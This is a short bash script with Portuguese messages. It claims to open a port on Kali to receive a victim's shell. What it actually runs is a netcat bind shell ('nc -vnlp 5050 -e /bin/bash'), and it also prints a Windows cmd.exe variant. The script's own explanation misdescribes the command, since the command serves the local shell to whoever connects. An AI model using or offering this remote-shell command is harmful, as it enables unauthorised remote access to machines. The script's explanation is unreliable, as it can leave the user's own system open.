#!/bin/bash
echo "Vamos abrir uma porta no Kali para se conecetar com outra maquina e receber a conexão do shell da vitima"
sleep 4
 echo "Para abrir essa conexão no Windows -vnlp 5050 -e cmd.exe"
sleep 4
echo "Abrindo a Conexão..."
sleep 3
nc -vnlp 5050 -e /bin/bash
echo "Pronto só conectar com a outra maquina"
